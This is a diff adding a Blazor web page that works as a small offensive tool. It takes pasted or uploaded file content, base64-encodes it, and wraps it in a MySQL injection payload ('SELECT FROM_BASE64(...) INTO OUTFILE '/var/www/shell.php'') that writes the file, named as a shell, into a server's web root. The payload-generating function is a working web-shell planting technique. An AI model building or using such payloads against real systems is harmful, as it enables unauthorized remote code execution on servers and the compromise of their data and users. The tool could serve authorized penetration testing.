@@ -1,0 +1,151 @@
+﻿@page "/"
+@using System.IO
+
+<div class="container mt-3 mb-4">
+    <div class="card">
+        <div class="card-body">
+            <p class="card-text">
+                This is a small Tool which allows you to generate a SQL Payload which writes out a File.
+                The File content can be pasted in the field below or uploaded.</p>
+        </div>
+    </div>
+</div>
+
+<div class="container p-3">
+    <MatTextField @bind-Value="@pasteFileContent" PlaceHolder="Paste here" TextArea="true" FullWidth="true" Outlined="true" rows="10"></MatTextField>
+</div>
+
+<div class="container p-3">
+    <MatFileUpload OnChange="@FilesReadyForContent"></MatFileUpload>
+</div>
+
+
+<div class="container mt-3">
+
+        <div class="card">
+            <div class="card-body">
+
+                @if (generating)
+                {
+
+                    <h6 class="card-subtitle mb-2 text-muted text-center">Payload is being generated - Please wait</h6>
+                    <SpinKitCubeGrid />
+                }
+                else if (payload != null)
+                {
+                    <h6 class="card-subtitle mb-2 text-muted text-center">Payload successfull generated</h6>
+                    <div class="overflow-auto" style="max-height: 300px;">
+                        <code>
+                            @payload
+                        </code>
+                    </div>
+                }
+                else if (errorGenerating)
+                {
+
+                    <div class="alert alert-danger" role="alert">
+                        Failed to generate SQL Payload!
+                    </div>
+
+                }
+            </div>
+        </div>
+</div>
+
+
+@code
+{
+    string payload = null;
+    bool generating = false;
+    bool errorGenerating = false;
+
+    private string _pasteFileContent;
+
+    public string pasteFileContent
+    {
+        get => _pasteFileContent;
+        set
+        {
+            if (_pasteFileContent != value)
+            {
+                _pasteFileContent = value;
+                this.StateHasChanged();
+
+                try
+                {
+
+                    string base64 = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(_pasteFileContent));
+
+                    payload = GenerateSQLPayload(base64);
+
+                }
+                catch (Exception)
+                {
+                    errorGenerating = true;
+                    payload = null;
+                }
+                finally
+                {
+                    generating = false;
+                    this.StateHasChanged();
+                }
+
+            }
+
+        }
+    }
+
+
+    private string GenerateSQLPayload(string base64)
+    {
+
+        return string.Format("SELECT FROM_BASE64('{0}') INTO OUTFILE '/var/www/shell.php'", base64);
+
+    }
+
+    async Task FilesReadyForContent(IMatFileUploadEntry[] files)
+    {
+
+        try
+        {
+
+            var file = files.FirstOrDefault();
+            byte[] bytes;
+
+            generating = true;
+
+            await InvokeAsync(StateHasChanged);
+
+            if (file == null)
+            {
+                return;
+            }
+
+
+            using (var stream = new MemoryStream())
+            {
+                await file.WriteToStreamAsync(stream);
+
+                bytes = stream.ToArray();
+            }
+
+
+            string base64 = Convert.ToBase64String(bytes);
+
+
+            payload = GenerateSQLPayload(base64);
+
+        }
+        catch (Exception)
+        {
+            errorGenerating = true;
+            payload = null;
+        }
+        finally
+        {
+            generating = false;
+            await InvokeAsync(StateHasChanged);
+        }
+
+    }
+}
